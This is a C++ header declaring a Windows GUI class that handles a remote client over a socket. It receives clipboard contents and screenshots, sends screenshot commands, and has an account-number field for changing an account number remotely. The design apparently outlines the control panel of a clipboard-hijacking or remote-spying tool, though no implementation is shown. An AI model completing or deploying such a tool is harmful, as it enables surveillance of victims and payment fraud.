#pragma once
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef UNICODE
#define UNICODE
#endif//UNICODE
#include "Metadata.hh"
#include <vector>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include "SocketListener.hh"
#include <iostream>
#include "WinapiHelpers.hh"
#include "ClientHandlerWindow.hh"
#include "IpAddress.hh"
#include "Socket.hh"



#pragma comment(lib, "Ws2_32.lib")
class ClientHandlerWindow : public BaseWindow<ClientHandlerWindow>
{
public:
	explicit ClientHandlerWindow(SOCKET clientSocket);
	virtual ~ClientHandlerWindow();
	void RecvClipboardString(const Metadata& metadata);
	std::vector<char> RecvScreenshotAsJpgBytes(const Metadata& metadata);
	void SaveScreenshot(const std::vector<char>& screenshot);
	void Handle();
	void ChangeAccountNumber(std::string accountNumber);
	void SendScreenshotCmd();
	void Close();

	IpAddress ipAddress;
	LRESULT HandleMessage(UINT uMsg, WPARAM wParam, LPARAM lParam) override;

	std::vector<char> GetLastScreenshot() const;
	void SetLastScreenshot(const std::vector<char>& lastScreenshot);
protected:
	PCWSTR ClassName() const override { return L"ClientHandlerWindow"; }
private:
	SOCKET clientSocket;
	std::vector<std::string> clipboardContentHistory;
	Socket socket;
	HWND changeAccountButton{};
	HWND refreshScreenshotButton{};
	HWND accountNoTextField{};
	HWND clipboardListBox{};
	std::vector<char> lastScreenshot{};
	mutable std::mutex lastScreenshotMutex{};
};

